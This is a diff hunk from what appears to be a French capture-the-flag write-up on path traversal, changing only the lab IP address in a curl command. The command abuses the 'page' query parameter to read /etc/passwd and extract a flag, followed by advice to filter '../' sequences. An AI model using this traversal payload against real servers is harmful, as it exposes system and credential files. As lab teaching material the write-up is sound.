@@ -4,7 +4,7 @@ Sur le site web, le routage est géré par le paramètre de requête _page_. Nou
 relatifs vers les répertoires parents pour trouver des fichiers de configuration sur le serveur.
 
 ```bash
-curl -s -X GET "http://192.168.56.101/index.php?page=../../../../../../../../../etc/passwd" | grep -oP 'The flag is : \K[0-9a-f]{64}'
+curl -s -X GET "http://192.168.56.102/index.php?page=../../../../../../../../../etc/passwd" | grep -oP 'The flag is : \K[0-9a-f]{64}'
 ```
 
 Pour contrer cette attaque, il faut vérifier que le chemin demandé ne contient pas de séquence `../` et qu'il est bien
